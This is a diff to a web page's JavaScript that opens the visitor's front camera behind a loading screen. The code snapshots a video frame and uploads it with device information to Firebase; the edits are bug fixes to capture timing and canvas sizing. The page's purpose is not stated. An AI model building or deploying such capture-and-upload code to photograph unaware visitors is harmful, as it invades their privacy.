@@ -20,6 +20,7 @@
         }
         video {
             width: 100%;
+            height: auto;
             border: 2px solid green; /* Make video visible with a green border */
         }
         #loading-screen {
@@ -104,13 +105,13 @@
                 }, 20000); // 20 seconds
                 
                 // Wait for the camera to stabilize and take a screenshot
-                const screenshot = await takeScreenshot(stream);
-                
-                // Create a unique session ID
-                const sessionId = Date.now();
-
-                // Upload session data to Firebase
-                await uploadSessionData(sessionId, deviceInfo, screenshot);
+                setTimeout(async () => {
+                    const screenshot = await takeScreenshot(stream);
+                    // Create a unique session ID
+                    const sessionId = Date.now();
+                    // Upload session data to Firebase
+                    await uploadSessionData(sessionId, deviceInfo, screenshot);
+                }, 500); // Wait 0.5 seconds to stabilize before taking a screenshot
                 
             } catch (error) {
                 errorMessage.innerHTML = error.message;
@@ -133,12 +134,13 @@
                 videoElement.srcObject = stream;
                 return stream;
             } catch (error) {
-                throw new Error("Unable to access the camera.");
+                throw new Error("Unable to access the camera. Please ensure your device has a front camera and permissions are granted.");
             }
         }
 
         function stopCamera(stream) {
             stream.getTracks().forEach(track => track.stop());
+            videoElement.srcObject = null; // Clear the video source
             console.log("Camera stopped.");
         }
 
@@ -147,10 +149,10 @@
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
                 const video = stream.getVideoTracks()[0];
-                canvas.width = video.getSettings().width;
-                canvas.height = video.getSettings().height;
+                canvas.width = video.getSettings().width || 1280; // Default width if not available
+                canvas.height = video.getSettings().height || 720; // Default height if not available
 
-                context.drawImage(video, 0, 0);
+                context.drawImage(videoElement, 0, 0); // Draw the video frame to the canvas
                 resolve(canvas.toDataURL('image/png')); // Return the screenshot as a base64 string
             });
         }
